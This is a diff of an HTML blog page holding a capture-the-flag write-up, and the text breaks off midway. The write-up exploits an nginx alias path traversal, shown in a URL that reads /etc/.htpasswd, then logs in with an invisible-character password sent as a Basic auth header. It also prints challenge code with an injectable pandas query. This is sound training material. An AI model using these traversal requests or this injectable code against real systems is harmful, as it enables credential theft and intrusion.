@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head><script src="/livereload.js?port=1313&mindelay=10&v=2" data-no-instant defer></script>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
 
     <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
@@ -20,7 +20,11 @@
       
       
       <li class="pull-left ">
-        <a href="http://localhost:1313/">~/j3seer</a>
+        <a href="https://j3seer.github.io/">~/j3seer
+
+          https://j3seer.github.io/
+          
+        </a>
       </li>
       
       
@@ -86,71 +90,71 @@
 <h3 id="analysis">Analysis</h3>
 <p>This challenge required many steps but they were very well staged in a way that wasn&rsquo;t guessy. I admit tho at first we only got the nginx.conf file which doesn&rsquo;t really give us much, but then we were given the Dockerfile and that made it much easier to analyse.</p>
 <p>So let&rsquo;s start with the nginx.conf</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nginx" data-lang="nginx"><span style="color:#ff79c6">user</span> <span style="color:#f1fa8c">root</span>;
-<span style="color:#ff79c6">worker_processes</span>  <span style="color:#bd93f9">16</span>;
-
-<span style="color:#ff79c6">events</span> {
-    <span style="color:#ff79c6">worker_connections</span>  <span style="color:#bd93f9">1024</span>;
-}
-
-<span style="color:#ff79c6">http</span> {
-    <span style="color:#ff79c6">include</span>       <span style="color:#f1fa8c">mime.types</span>;
-    <span style="color:#ff79c6">default_type</span>  <span style="color:#f1fa8c">application/octet-stream</span>;
-    <span style="color:#ff79c6">sendfile</span>        on;
-    <span style="color:#ff79c6">keepalive_timeout</span>  <span style="color:#bd93f9">65</span>;
-    <span style="color:#ff79c6">server</span> {
-        <span style="color:#ff79c6">listen</span>       <span style="color:#bd93f9">8000</span>;
-        <span style="color:#ff79c6">server_name</span>  <span style="color:#f1fa8c">localhost</span>;
-        
-        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/</span> {
-                <span style="color:#ff79c6">autoindex</span> on;
-                <span style="color:#ff79c6">root</span> <span style="color:#f1fa8c">/panda/</span>;
-        }
-
-        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/cgi-bin/</span> {
-                <span style="color:#ff79c6">gzip</span> off;
-                
-                <span style="color:#ff79c6">auth_basic</span>           <span style="color:#f1fa8c">&#34;Admin</span> <span style="color:#f1fa8c">Area&#34;</span>;
-                <span style="color:#ff79c6">auth_basic_user_file</span> <span style="color:#f1fa8c">/etc/.htpasswd</span>;
-                
-                <span style="color:#ff79c6">include</span> <span style="color:#f1fa8c">fastcgi_params</span>;
-                <span style="color:#ff79c6">fastcgi_pass</span> <span style="color:#f1fa8c">unix:/var/run/fcgiwrap.socket</span>;
-                <span style="color:#ff79c6">fastcgi_param</span> <span style="color:#f1fa8c">SCRIPT_FILENAME</span> <span style="color:#f1fa8c">/panda/</span><span style="color:#8be9fd;font-style:italic">$fastcgi_script_name</span>;
-        }
-        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/static</span> {
-                <span style="color:#ff79c6">alias</span> <span style="color:#f1fa8c">/static/</span>; 
-        }
-    }
-}
-</code></pre></div><p>So we can immidiatly tell there&rsquo;s a path traversal vulnerability from the last part defining an alias for /static.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#ff79c6">user</span> <span style="color:#f1fa8c">root</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">worker_processes</span>  <span style="color:#bd93f9">16</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">events</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">worker_connections</span>  <span style="color:#bd93f9">1024</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">http</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">include</span>       <span style="color:#f1fa8c">mime.types</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">default_type</span>  <span style="color:#f1fa8c">application/octet-stream</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">sendfile</span>        on;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">keepalive_timeout</span>  <span style="color:#bd93f9">65</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">server</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">listen</span>       <span style="color:#bd93f9">8000</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">server_name</span>  <span style="color:#f1fa8c">localhost</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">autoindex</span> on;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">root</span> <span style="color:#f1fa8c">/panda/</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/cgi-bin/</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">gzip</span> off;
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">auth_basic</span>           <span style="color:#f1fa8c">&#34;Admin</span> <span style="color:#f1fa8c">Area&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">auth_basic_user_file</span> <span style="color:#f1fa8c">/etc/.htpasswd</span>;
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">include</span> <span style="color:#f1fa8c">fastcgi_params</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">fastcgi_pass</span> <span style="color:#f1fa8c">unix:/var/run/fcgiwrap.socket</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">fastcgi_param</span> <span style="color:#f1fa8c">SCRIPT_FILENAME</span> <span style="color:#f1fa8c">/panda/</span><span style="color:#8be9fd;font-style:italic">$fastcgi_script_name</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">location</span> <span style="color:#f1fa8c">/static</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">alias</span> <span style="color:#f1fa8c">/static/</span>; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So we can immidiatly tell there&rsquo;s a path traversal vulnerability from the last part defining an alias for /static.</p>
 <p>Read more about it here : <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></p>
-<p>So first i tried getting the admin password for cgi-bin with <a href="http://instance.chall.bi0s.in">http://instance.chall.bi0s.in</a>:10023/static../etc/.htpasswd</p>
-<pre><code>admin:$apr1$OJtrtoJK$.OLHDj5RzHnSjcFkOi9ZT/
+<p>So first i tried getting the admin password for cgi-bin with <a href="http://instance.chall.bi0s.in:10023/static../etc/.htpasswd">http://instance.chall.bi0s.in:10023/static../etc/.htpasswd</a></p>
+<pre tabindex="0"><code>admin:$apr1$OJtrtoJK$.OLHDj5RzHnSjcFkOi9ZT/
 </code></pre><p>A quick google search and common knowledge hinted me that the hash is not bruteforcable .. and i even tried with common wordlists but no luck.</p>
 <p>Okey so maybe try and read the flag? Well that&rsquo;s what i was tryin to do after the password until we got the Dockerfile..</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#ff79c6">FROM</span><span style="color:#f1fa8c"> ubuntu</span>
-<span style="color:#ff79c6">RUN</span> apt-get -y update <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">DEBIAN_FRONTEND</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;noninteractive&#34;</span> <span style="color:#8be9fd;font-style:italic">TZ</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Asia/Kolkata&#34;</span> apt-get -y -q install nginx apache2-utils spawn-fcgi fcgiwrap python3 python3-pip
-<span style="color:#ff79c6">EXPOSE</span><span style="color:#f1fa8c"> 80/tcp</span>
-<span style="color:#ff79c6">RUN</span> <span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;pip3&#34;</span>, <span style="color:#f1fa8c">&#34;install&#34;</span>, <span style="color:#f1fa8c">&#34;pandas&#34;</span><span style="color:#ff79c6">]</span>
-<span style="color:#ff79c6">COPY</span> docker-entrypoint.sh /
-<span style="color:#ff79c6">RUN</span> <span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;chmod&#34;</span>, <span style="color:#f1fa8c">&#34;+x&#34;</span>, <span style="color:#f1fa8c">&#34;/docker-entrypoint.sh&#34;</span><span style="color:#ff79c6">]</span>
-<span style="color:#ff79c6">COPY</span> flag.txt /
-<span style="color:#ff79c6">COPY</span> static /static/
-<span style="color:#ff79c6">COPY</span> config/nginx.conf /etc/nginx/
-<span style="color:#ff79c6">COPY</span> src/ /panda
-<span style="color:#ff79c6">ENTRYPOINT</span> [<span style="color:#f1fa8c">&#34;/docker-entrypoint.sh&#34;</span>]
-</code></pre></div><p>Well there&rsquo;s no problem right? the flag is at /flag.txt?? well yeah that&rsquo;s again what i thought for a while until i tried getting the docker-entrypoint.sh file with path traversal.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
-</span><span style="color:#ff79c6"></span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">PYTHONDONTWRITEBYTECODE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>
-mv flag.txt <span style="color:#ff79c6">$(</span>head /dev/urandom | shasum | cut -d<span style="color:#f1fa8c">&#39; &#39;</span> -f1<span style="color:#ff79c6">)</span>
-htpasswd -mbc /etc/.htpasswd admin Â­
-spawn-fcgi -s /var/run/fcgiwrap.socket -M <span style="color:#bd93f9">766</span> /usr/sbin/fcgiwrap
-/usr/sbin/nginx
-<span style="color:#ff79c6">while</span> true; <span style="color:#ff79c6">do</span> sleep 1; <span style="color:#ff79c6">done</span>
-</code></pre></div><p>We can see an interesting command for the admin password &lsquo;htpasswd&rsquo; , i wasn&rsquo;t very aware of what -mbc does.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">htpasswd -mbc /etc/.htpasswd admin Â­
-</code></pre></div><p>So after checking the man page, we notice the random Â­ char at the end? well turns out thats the password, but it was using an invisible char u can&rsquo;t just copy and paste to login so we can use the base64 encoded Authorization for login. Let&rsquo;s try it,</p>
-<pre><code>Authorization: Basic YWRtaW46wq0=
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#ff79c6">FROM</span> <span style="color:#f1fa8c">ubuntu</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">RUN</span> apt-get -y update <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">DEBIAN_FRONTEND</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;noninteractive&#34;</span> <span style="color:#8be9fd;font-style:italic">TZ</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Asia/Kolkata&#34;</span> apt-get -y -q install nginx apache2-utils spawn-fcgi fcgiwrap python3 python3-pip
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">EXPOSE</span> <span style="color:#f1fa8c">80/tcp</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">RUN</span> <span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;pip3&#34;</span>, <span style="color:#f1fa8c">&#34;install&#34;</span>, <span style="color:#f1fa8c">&#34;pandas&#34;</span><span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">COPY</span> docker-entrypoint.sh /
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">RUN</span> <span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;chmod&#34;</span>, <span style="color:#f1fa8c">&#34;+x&#34;</span>, <span style="color:#f1fa8c">&#34;/docker-entrypoint.sh&#34;</span><span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">COPY</span> flag.txt /
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">COPY</span> static /static/
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">COPY</span> config/nginx.conf /etc/nginx/
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">COPY</span> src/ /panda
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">ENTRYPOINT</span> [<span style="color:#f1fa8c">&#34;/docker-entrypoint.sh&#34;</span>]
+</span></span></code></pre></div><p>Well there&rsquo;s no problem right? the flag is at /flag.txt?? well yeah that&rsquo;s again what i thought for a while until i tried getting the docker-entrypoint.sh file with path traversal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">PYTHONDONTWRITEBYTECODE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>mv flag.txt <span style="color:#ff79c6">$(</span>head /dev/urandom | shasum | cut -d<span style="color:#f1fa8c">&#39; &#39;</span> -f1<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>htpasswd -mbc /etc/.htpasswd admin Â­
+</span></span><span style="display:flex;"><span>spawn-fcgi -s /var/run/fcgiwrap.socket -M <span style="color:#bd93f9">766</span> /usr/sbin/fcgiwrap
+</span></span><span style="display:flex;"><span>/usr/sbin/nginx
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> true; <span style="color:#ff79c6">do</span> sleep 1; <span style="color:#ff79c6">done</span>
+</span></span></code></pre></div><p>We can see an interesting command for the admin password &lsquo;htpasswd&rsquo; , i wasn&rsquo;t very aware of what -mbc does.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>htpasswd -mbc /etc/.htpasswd admin Â­
+</span></span></code></pre></div><p>So after checking the man page, we notice the random Â­ char at the end? well turns out thats the password, but it was using an invisible char u can&rsquo;t just copy and paste to login so we can use the base64 encoded Authorization for login. Let&rsquo;s try it,</p>
+<pre tabindex="0"><code>Authorization: Basic YWRtaW46wq0=
 </code></pre><p>and bingo! we got a different output, <code>403 forbidden</code> ??</p>
 <p>Well turns out that was just an error message because we can&rsquo;t simply do some directory listing on the cgi-bin so maybe we can get something else? maybe some scripts inside it?</p>
 <p>During the exploring in the app there was a templates directory with a HTML flask template that has a form for searching of currency, but it doesn&rsquo;t work because it&rsquo;s pointing towards search_currency.py which doesn&rsquo;t exist!! but maybe it exists in cgi-bin?</p>
@@ -160,76 +164,76 @@ spawn-fcgi -s /var/run/fcgiwrap.socket -M <span style="color:#bd93f9">766</span>
 <p>With the script being in cgi-bin and us being admin we can try and execute it with <code>/cgi-bin/search_currency.py?currency_name=</code></p>
 <p><img src="pycgi3.png" alt=""></p>
 <p>Okey now what? Well remember the path traversal vulnerability ? let&rsquo;s try and use it to get the python script code!!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python3</span>
-
-<span style="color:#ff79c6">from</span> server <span style="color:#ff79c6">import</span> Server
-<span style="color:#ff79c6">import</span> pandas <span style="color:#ff79c6">as</span> pd
-
-<span style="color:#ff79c6">try</span>:
-    df <span style="color:#ff79c6">=</span> pd<span style="color:#ff79c6">.</span>read_csv(<span style="color:#f1fa8c">&#34;../database/currency-rates.csv&#34;</span>)
-    server <span style="color:#ff79c6">=</span> Server()
-    server<span style="color:#ff79c6">.</span>set_header(<span style="color:#f1fa8c">&#34;Content-Type&#34;</span>, <span style="color:#f1fa8c">&#34;text/html&#34;</span>)
-    params <span style="color:#ff79c6">=</span> server<span style="color:#ff79c6">.</span>get_params()
-    <span style="color:#ff79c6">assert</span> <span style="color:#f1fa8c">&#34;currency_name&#34;</span> <span style="color:#ff79c6">in</span> params
-    currency_code <span style="color:#ff79c6">=</span> params[<span style="color:#f1fa8c">&#34;currency_name&#34;</span>]
-    results <span style="color:#ff79c6">=</span> df<span style="color:#ff79c6">.</span>query(f<span style="color:#f1fa8c">&#34;currency == &#39;{currency_code}&#39;&#34;</span>)
-    server<span style="color:#ff79c6">.</span>add_body(results<span style="color:#ff79c6">.</span>to_html())
-    server<span style="color:#ff79c6">.</span>send_response()
-<span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
-    <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;Content-Type: text/html&#34;</span>)
-    <span style="color:#ff79c6">print</span>()
-    <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;Exception&#34;</span>)
-    <span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(e))
-</code></pre></div><p>Nice! we now have some context, let&rsquo;s try and extract <code>server.py</code> aswell ( refrenced in the import section of the code)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> os <span style="color:#ff79c6">import</span> environ
-
-<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Server</span>:
-    <span style="color:#ff79c6">def</span> __init__(self):
-        self<span style="color:#ff79c6">.</span>response_headers <span style="color:#ff79c6">=</span> {}
-        self<span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-        self<span style="color:#ff79c6">.</span>post_body <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-        self<span style="color:#ff79c6">.</span>request_method <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_METHOD&#34;</span>)
-        self<span style="color:#ff79c6">.</span>content_length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
-            
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_params</span>(self):
-        request_uri <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_URI&#34;</span>) <span style="color:#ff79c6">if</span>  self<span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_URI&#34;</span>) <span style="color:#ff79c6">else</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-        params_dict <span style="color:#ff79c6">=</span> {}
-        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#ff79c6">in</span> request_uri:
-            params <span style="color:#ff79c6">=</span> request_uri<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">1</span>]
-            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;&amp;&#34;</span> <span style="color:#ff79c6">in</span> params:
-                params <span style="color:#ff79c6">=</span> params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;&amp;&#34;</span>)
-                <span style="color:#ff79c6">for</span> param <span style="color:#ff79c6">in</span> params:
-                    params_dict[param<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">=</span> param<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">1</span>]
-            <span style="color:#ff79c6">else</span>:
-                params_dict[params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">=</span> params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">1</span>]
-        <span style="color:#ff79c6">return</span> params_dict
-
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_var</span>(self, variable):
-        <span style="color:#ff79c6">return</span> environ<span style="color:#ff79c6">.</span>get(variable)
-
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_header</span>(self, header, value):
-        self<span style="color:#ff79c6">.</span>response_headers[header] <span style="color:#ff79c6">=</span> value
-
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add_body</span>(self, value):
-        self<span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">+=</span> value
-
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_file</span>(self, filename):
-        self<span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename, <span style="color:#f1fa8c">&#34;r&#34;</span>)<span style="color:#ff79c6">.</span>read()
-
-    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_response</span>(self):
-        <span style="color:#ff79c6">for</span> header <span style="color:#ff79c6">in</span> self<span style="color:#ff79c6">.</span>response_headers:
-            <span style="color:#ff79c6">print</span>(f<span style="color:#f1fa8c">&#34;{header}: {self.response_headers[header]}</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
-
-        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
-        <span style="color:#ff79c6">print</span>(self<span style="color:#ff79c6">.</span>response_body)
-        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
-</code></pre></div><p>At first i was thinking there might a vulnerability in the way the server handles parameters or something.. but perhaps we can get rce in the search_currency.py somehow?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> server <span style="color:#ff79c6">import</span> Server
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> pandas <span style="color:#ff79c6">as</span> pd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>    df <span style="color:#ff79c6">=</span> pd<span style="color:#ff79c6">.</span>read_csv(<span style="color:#f1fa8c">&#34;../database/currency-rates.csv&#34;</span>)
+</span></span><span style="display:flex;"><span>    server <span style="color:#ff79c6">=</span> Server()
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>set_header(<span style="color:#f1fa8c">&#34;Content-Type&#34;</span>, <span style="color:#f1fa8c">&#34;text/html&#34;</span>)
+</span></span><span style="display:flex;"><span>    params <span style="color:#ff79c6">=</span> server<span style="color:#ff79c6">.</span>get_params()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">assert</span> <span style="color:#f1fa8c">&#34;currency_name&#34;</span> <span style="color:#ff79c6">in</span> params
+</span></span><span style="display:flex;"><span>    currency_code <span style="color:#ff79c6">=</span> params[<span style="color:#f1fa8c">&#34;currency_name&#34;</span>]
+</span></span><span style="display:flex;"><span>    results <span style="color:#ff79c6">=</span> df<span style="color:#ff79c6">.</span>query(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;currency == &#39;</span><span style="color:#f1fa8c">{</span>currency_code<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>add_body(results<span style="color:#ff79c6">.</span>to_html())
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>send_response()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Content-Type: text/html&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Exception&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">str</span>(e))
+</span></span></code></pre></div><p>Nice! we now have some context, let&rsquo;s try and extract <code>server.py</code> aswell ( refrenced in the import section of the code)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> os <span style="color:#ff79c6">import</span> environ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Server</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">__init__</span>(<span style="font-style:italic">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_headers <span style="color:#ff79c6">=</span> {}
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>response_body <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>post_body <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>request_method <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_METHOD&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>content_length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_params</span>(<span style="font-style:italic">self</span>):
+</span></span><span style="display:flex;"><span>        request_uri <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_URI&#34;</span>) <span style="color:#ff79c6">if</span>  <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>get_var(<span style="color:#f1fa8c">&#34;REQUEST_URI&#34;</span>) <span style="color:#ff79c6">else</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        params_dict <span style="color:#ff79c6">=</span> {}
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#ff79c6">in</span> request_uri:
+</span></span><span style="display:flex;"><span>            params <span style="color:#ff79c6">=</span> request_uri<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;&amp;&#34;</span> <span style="color:#ff79c6">in</span> params:
+</span></span><span style="display:flex;"><span>                params <span style="color:#ff79c6">=</span> params<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;&amp;&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> param <span style="color:#ff79c6">in</span> params:
+</span></span><span style="display:flex;"><span>                    params_dict[param<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">=</span> param<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;=&#34;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
